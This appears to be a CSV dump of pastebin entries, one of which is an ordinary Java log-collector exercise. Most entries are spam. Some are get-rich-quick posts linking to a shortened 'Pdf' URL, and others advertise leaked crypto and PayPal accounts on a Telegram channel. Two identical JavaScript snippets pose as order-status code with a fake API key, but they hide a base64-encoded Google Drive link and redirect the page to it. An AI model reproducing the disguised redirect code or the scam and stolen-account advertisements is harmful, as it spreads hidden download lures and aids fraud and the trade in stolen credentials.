id,title,username,language,date,content
1Q34mF0T,EARN $900 INSTANTLY 2025 M6,kadohasrona,JavaScript,Saturday 26th of April 2025 01:06:04 PM CDT," 
Pdf https://tinyurl.com/privguidee

LhAnDvUEEz
"
r1vBANVB,Crypto Accounts,rodrigomaise99,JavaScript,Saturday 26th of April 2025 01:05:29 PM CDT,98499 Accounts Posted On https://t.me/leakedbyem1nem
pcMtjxAN,Market.js,x2LeaF,JavaScript,Saturday 26th of April 2025 12:58:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10362/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7Waz6tbe,EARN $900 INSTANTLY 2025 M6,SoftechSource,JavaScript,Saturday 26th of April 2025 12:56:30 PM CDT," 
Pdf https://tinyurl.com/privguidee

olZgv4lJsU
"
9SbjuhqA,[NP] Services & Microservices,dzocesrce,Java,Saturday 26th of April 2025 12:52:13 PM CDT,"import java.util.Scanner;
import java.util.HashMap;
import java.util.Map;
import java.util.stream.Collectors;
import java.util.ArrayList;
import java.util.List;
import java.util.*;

class Microservice {
    String microserviceName;
    List<Log> logs;

    public Microservice(String microserviceName) {
        this.microserviceName = microserviceName;
        this.logs= new ArrayList<>();
    }

    public String getMicroserviceName() {
        return microserviceName;
    }


    public int getSerenity(){
        return logs.stream().mapToInt(i->i.getLogSerenity()).sum();
    }

    @Override
    public String toString() {
        StringBuilder stringBuilder= new StringBuilder();
        for(Log l : logs){
            stringBuilder.append(String.format(""%s %s"",microserviceName,l.toString()));
        }
        return stringBuilder.toString().trim();
    }
}

class Log {
    String type;
    String message;
    int timestamp;

    public Log(String type, String message, int timestamp) {

        this.type = type;
        this.message = message;
        this.timestamp = timestamp;
    }


    public String getType() {
        return type;
    }

    public String getMessage() {
        return message;
    }

    public int getLogSerenity(){
        int serenity=0;
        if(type.equals(""WARN"")){
            serenity++;
            if(message.contains(""might cause error""))
                serenity++;
        }
        else if(type.equals(""ERROR"")){
            serenity+=3;
            if(message.contains(""fatal""))
                serenity+=2;
            if(message.contains(""exception""))
                serenity+=3;
        }
        return serenity;
    }

    public int getTimestamp() {
        return timestamp;
    }

    @Override
    public String toString() {
        return String.format("" [%s]%s %d T:%d"",type,message,timestamp,timestamp);
    }
}


class LogCollector {
    Map<String,Service> services;
    public LogCollector() {
        services= new HashMap<>();
    }

    public void addLog(String log) {
        String[] parts= log.split(""\\s+"");
        String service = parts[0];
        String microservice = parts[1];
        String type = parts[2];
        String message="""";
        for(int i=3;i<parts.length-1;i++){
            message= message.concat("" ""+parts[i]);
        }
        int timestamp= Integer.parseInt(parts[parts.length-1]);
        services.putIfAbsent(service,new Service(service));
        services.get(service).microservices.putIfAbsent(microservice,new Microservice(microservice));
        services.get(service).microservices.get(microservice).logs.add(new Log(type,message,timestamp));

    }

    public void printServicesBySeverity() {
        services.values().stream().sorted().forEach(i-> System.out.println(i));
    }

    public Map<Integer, Long> getSeverityDistribution(String service, String microservice) {
        if(microservice==null)
            return services.get(service).microservices.values().stream().flatMap(list->list.logs.stream()).collect(Collectors.groupingBy(
                    Log::getLogSerenity,
                    Collectors.counting()
            ));

        return services.get(service).microservices.get(microservice).logs.stream().collect(Collectors.groupingBy(
                Log::getLogSerenity,
                Collectors.counting()
        ));
    }

    public void displayLogs(String service, String microservice, String order) {

        Comparator<Log> OLDEST_FIRST = Comparator.comparing(Log::getTimestamp);
        Comparator<Log> NEWEST_FIRST = OLDEST_FIRST.reversed();
        Comparator<Log> LEAST_SEVERE_FIRST = Comparator.comparing(Log::getLogSerenity);
        Comparator<Log> MOST_SEVERE_FIRST = LEAST_SEVERE_FIRST.reversed();
        Comparator<Log> comparator;
        if(order.equals(""OLDEST_FIRST""))
            comparator= OLDEST_FIRST;
        else if(order.equals(""NEWEST_FIRST""))
            comparator= NEWEST_FIRST;
        else if(order.equals(""LEAST_SEVERE_FIRST""))
            comparator= LEAST_SEVERE_FIRST;
        else
            comparator= MOST_SEVERE_FIRST;

        if(microservice==null){
            System.out.println(String.format(""displayLogs %s %s"",service,order));
            services.get(service).microservices.values()
                    .stream().flatMap(list->list.logs.stream()).sorted(comparator).forEach(i-> System.out.println(String.format(""%s%s"",service,i.toString())));
        }
        else{
            System.out.println(String.format(""displayLogs %s %s %s"",service,microservice,order));
            services.get(service).microservices.get(microservice)
                    .logs.stream().sorted(comparator).forEach(i-> System.out.println(String.format(""%s|%s%s"",service,microservice,i.toString())));
        }
        
    }
}

class Service implements Comparable<Service>{
    String serviceName;
    Map<String,Microservice> microservices;

    public int getSerenity(){
        return microservices.values().stream().mapToInt(i->i.getSerenity()).sum();
    }

    public double getAvgSerenity(){
        return getSerenity()/(double)getNumberOfLogs();
    }

    public int getNumberOfLogs(){
        return (int)microservices.values().stream().flatMap(list->list.logs.stream()).count();
    }

    public Service(String serviceName) {
        this.serviceName = serviceName;
        this.microservices = new HashMap<>();
    }

    @Override
    public String toString() {
        return String.format(""Service name: %s Count of microservices: %d "" +
                ""Total logs in service: %d Average severity for all logs: %.2f "" +
                ""Average number of logs per microservice: %.2f"",serviceName, microservices.size(),getNumberOfLogs()
                ,getAvgSerenity(),getNumberOfLogs()/(double)microservices.size());
    }

    @Override
    public int compareTo(Service o) {
        return Comparator.comparing(Service::getAvgSerenity).reversed().compare(this,o);
    }
}

public class LogsTester {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        LogCollector collector = new LogCollector();
        while (sc.hasNextLine()) {
            String line = sc.nextLine();
            if (line.startsWith(""addLog"")) {
                collector.addLog(line.replace(""addLog "", """"));
            } else if (line.startsWith(""printServicesBySeverity"")) {
                collector.printServicesBySeverity();
            } else if (line.startsWith(""getSeverityDistribution"")) {
                String[] parts = line.split(""\\s+"");
                String service = parts[1];
                String microservice = null;
                if (parts.length == 3) {
                    microservice = parts[2];
                }
                collector.getSeverityDistribution(service, microservice).forEach((k,v)-> System.out.printf(""%d -> %d%n"", k,v));
            } 
            
            else if (line.startsWith(""displayLogs"")){
                String[] parts = line.split(""\\s+"");
                String service = parts[1];
                String microservice = null;
                String order = null;
                if (parts.length == 4) {
                    microservice = parts[2];
                    order = parts[3];
                } else {
                    order = parts[2];
                }
                collector.displayLogs(service, microservice, order);
            }
            
        }
    }
}"
F7QG4PH4,PayPal with Balance,rodrigomaise99,JavaScript,Saturday 26th of April 2025 12:50:05 PM CDT,99511 Accounts Posted On https://t.me/leakedbyem1nem
u6Smyn8w,Make $1000 15-MINUTES (BEGINNER) 96,SoftechSource,JavaScript,Saturday 26th of April 2025 12:47:15 PM CDT," 
Pdf https://tinyurl.com/privguidee

NbkJ3DQgPt
"
Uec654Vv,Untitled,x2LeaF,JavaScript,Saturday 26th of April 2025 12:43:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23528/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HcKwdhAe,EARN $900 INSTANTLY 2025 M6,covertbelli,JavaScript,Saturday 26th of April 2025 12:37:19 PM CDT," 
Pdf https://tinyurl.com/privguidee

FrpYNbea1C
"
cJSmGmC6,Leaked Accounts - Fresh Hits,rodrigomaise99,JavaScript,Saturday 26th of April 2025 12:34:43 PM CDT,05451 Accounts Posted On https://t.me/leakedbyem1nem
